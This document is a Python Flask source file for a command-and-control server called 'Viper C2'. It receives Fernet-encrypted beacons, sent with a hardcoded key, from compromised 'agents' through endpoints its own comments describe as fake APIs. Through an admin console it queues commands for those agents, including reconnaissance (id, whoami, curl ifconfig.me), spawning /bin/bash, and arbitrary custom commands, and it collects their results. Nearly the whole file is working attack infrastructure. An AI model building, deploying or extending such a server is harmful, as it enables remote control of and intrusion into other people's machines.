from flask import Flask, request, jsonify, json
from cryptography.fernet import Fernet
from pyfiglet import Figlet
import logging, threading


# ASCII ART -----------------------------------------------------------
def print_banner():
	f = Figlet(font='slant')
	print("\033[91m" + f.renderText('Viper C2') + "\033[0m")  # Red text

class Colors:
	RED = "\033[91m"
	GREEN = "\033[92m"
	YELLOW = "\033[93m"
	BLUE = "\033[94m"
	MAGENTA = "\033[95m"
	CYAN = "\033[96m"
	RESET = "\033[0m"

	@staticmethod
	def wrap(text, color):
		return f"{color}{text}{Colors.RESET}"

# Suppress default HTTP request logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

SECRET_KEY = b'WT5hC0nZ1IDySQnT11S1qNal_srGJIyFDBVNu5DA84g='
cipher = Fernet(SECRET_KEY)

def encrypt_data(data):
	encoded = data.encode()
	encrypted = cipher.encrypt(encoded)
	return encrypted.decode()

def decrypt_data(data):
	decrypted = cipher.decrypt(data.encode())
	return decrypted.decode()

tasks = {}
agents = set()

@app.route('/api/status', methods=['POST']) # Fake API for /beacon
def status():
	encrypted = request.json.get('data')
	decrypted_json = decrypt_data(encrypted)
	beacon_info = json.loads(decrypted_json)
	agent_id = beacon_info.get('id') # Extracts id field from JSON body

	if agent_id not in agents:
		print(Colors.wrap("[+] New agent connected: " + agent_id, Colors.GREEN))
		print("\n[admin] Enter 'list' to view agents, or 'send' to send command: ")
		agents.add(agent_id)
	if agent_id in tasks and tasks[agent_id]: # Check for any tasks left
		task = tasks[agent_id].pop(0) # Gets and removes task from list
		return jsonify({"task": task}) #JSON response
	else:
		return jsonify({"task": None})

@app.route('/api/upload', methods=['POST'])
def upload():
	encrypted = request.json.get('data')
	decrypted_json = decrypt_data(encrypted)
	result_info = json.loads(decrypted_json)
	agent_id = result_info.get('id')
	output = result_info.get('output')
	print("\n[+] Result from" + agent_id + " " + output)
	admin_prompt()
	return jsonify({"status": "received"})

@app.route('/push', methods = ['POST']) # Fake API for /task
def push():
	agent_id = request.json.get('id')
	command = request.json.get('command')
	if agent_id not in tasks: # Checks if agent has a task queue
		tasks[agent_id] = [] # If agent does not have a queue yet, initilise one
	tasks[agent_id].append(command) # Adds new command to agents task queue
	return jsonify({"status": "task queued"})

def admin_prompt():
	print(Colors.wrap("\n[admin] Enter 'list' to view agents, or 'send' to send command: ", Colors.BLUE), end="")

def admin_console():
	while True:
		admin_prompt()
		cmd = input().strip().lower()
		if cmd == "list":
			print("[*] Known agents:")
			for aid in agents:
				print(f" - {aid}")
		elif cmd == "send":
			agent_id = input("Enter agent ID: ").strip()
			if agent_id not in agents:
				print(Colors.wrap("[!] Invalid agent ID.", Colors.RED))
				continue

			# Task Menu
			print(Colors.wrap("\nWhat would you like to do?", Colors.YELLOW))
			print("1. Send a Message")
			print("2. Get user info")
			print("3. Get public IP")
			print("4. Kill Zombie")
			print("5. Start a Shell")
			print("6. Whoami")
			print("7. Custom Command")

			choice = input("Enter choice (1-6): ").strip()

			# Match choice to command
			commands = {
				"1": 'echo "Hello from C2 server!"',
				"2": "id",
				"3": "curl ifconfig.me",
				"4": "pkill -f zombie",     
				"5": "/bin/bash",
				"6": "whoami"
			}

			if choice == "7":
				command = input("Enter your custom command: ").strip()
			else:
				command = commands.get(choice)

			if command:
				if agent_id not in tasks:
					tasks[agent_id] = []
				tasks[agent_id].append(command)
				print(Colors.wrap(f"[+] Queued command '{command}' for agent '{agent_id}'", Colors.GREEN))
			else:
				print(Colors.wrap("[!] Invalid choice.", Colors.RED))

		else:
			print(Colors.wrap("[!] Unknown command. Use 'list' or 'send'.", Colors.RED))

if __name__ == "__main__":
	print_banner()
	threading.Thread(target = admin_console, daemon = True).start() # Admin_console daemon
	app.run(host = "0.0.0.0", port = 4444, debug = False, use_reloader = False)